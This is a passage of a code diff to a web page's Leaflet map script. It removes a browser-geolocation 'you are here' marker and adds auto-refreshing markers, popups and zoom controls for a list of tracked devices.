-      if (el) { el.textContent = txt; el.style.color = isErr ? '#f85149' : '#e6edf3'; }
-    }
-
-    // Blue "you are here" dot, visually distinct from the red device pins.
-    var meIcon = L.divIcon({
-      className: 'me-dot',
-      html: '<div style="width:16px;height:16px;border-radius:50%;' +
-            'background:#2f81f7;border:3px solid #fff;' +
-            'box-shadow:0 0 0 2px rgba(47,129,247,.5);"></div>',
-      iconSize: [16, 16],
-      iconAnchor: [8, 8]
-    });
-
-    function onGeoOk(pos) {
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
-      var acc = pos.coords.accuracy; // metres
-
-      // Place / move our marker.
-      if (meMarker) {
-        meMarker.setLatLng([lat, lon]);
+    
+    // Update marker
+    function updateMarker(device, color, index) {
+      const id = 'device-' + index;
+      if (markers[id]) {
+        markers[id].setLatLng([device.lat, device.lon]);
       } else {
-        meMarker = L.marker([lat, lon], { icon: meIcon, zIndexOffset: 1000 })
-          .addTo(map).bindPopup('<b>You are here</b>');
-      }
-      // Accuracy circle.
-      if (meCircle) {
-        meCircle.setLatLng([lat, lon]).setRadius(acc);
-      } else {
-        meCircle = L.circle([lat, lon], {
-          radius: acc, color: '#2f81f7', weight: 1,
-          fillColor: '#2f81f7', fillOpacity: 0.12
+        const circle = L.circleMarker([device.lat, device.lon], {
+          radius: 12, fillColor: color, color: '#fff', weight: 2, opacity: 1, fillOpacity: 0.85
         }).addTo(map);
-      }
-
-      setMeStatus('Your location: ' + lat.toFixed(3) + ', ' + lon.toFixed(3) +
-                  ' (accuracy: ' + Math.round(acc) + 'm)', false);
-
-      // Center on us the first time only (don't fight the user's panning).
-      if (!onGeoOk._centered) {
-        map.setView([lat, lon], Math.max(map.getZoom(), 14));
-        onGeoOk._centered = true;
+        circle.bindPopup(`<b>Device ${index + 1}</b><br>${device.lat.toFixed(5)}, ${device.lon.toFixed(5)}<br>±${Math.round(device.acc)}m`);
+        markers[id] = circle;
       }
     }
-
-    function onGeoErr(err) {
-      var msg;
-      switch (err.code) {
-        case err.PERMISSION_DENIED:    msg = 'Location permission denied.'; break;
-        case err.POSITION_UNAVAILABLE: msg = 'Location unavailable.'; break;
-        case err.TIMEOUT:              msg = 'Location request timed out.'; break;
-        default:                       msg = 'Location error: ' + (err.message || 'unknown');
+    
+    // Focus on device
+    function focusDevice(index) {
+      const device = devices[index];
+      if (device) {
+        map.setView([device.lat, device.lon], 15);
+        const marker = markers['device-' + index];
+        if (marker) marker.openPopup();
       }
-      setMeStatus(msg, true);
     }
-
-    // Kick off automatically on load. watchPosition keeps the dot live as
-    // the viewer moves; getCurrentPosition would be a one-shot alternative.
-    if ('geolocation' in navigator) {
-      navigator.geolocation.watchPosition(onGeoOk, onGeoErr, {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 5000
-      });
-    } else {
-      setMeStatus('Geolocation not supported by this browser.', true);
+    
+    // Fit map to all devices
+    function fitMap() {
+      if (devices.length === 0) return;
+      const bounds = devices.map(d => [d.lat, d.lon]);
+      map.fitBounds(bounds, { padding: [40, 40], maxZoom: 14 });
     }
-
-  })();
+    
+    // Auto-refresh
+    setInterval(loadDevices, 10000);
+    
+    // Init
+    initMap();
+    loadDevices();
+    
+    // Button handlers
+    document.getElementById('fitBtn').onclick = fitMap;
+    document.getElementById('refreshBtn').onclick = loadDevices;
   </script>
 </body>
 </html>
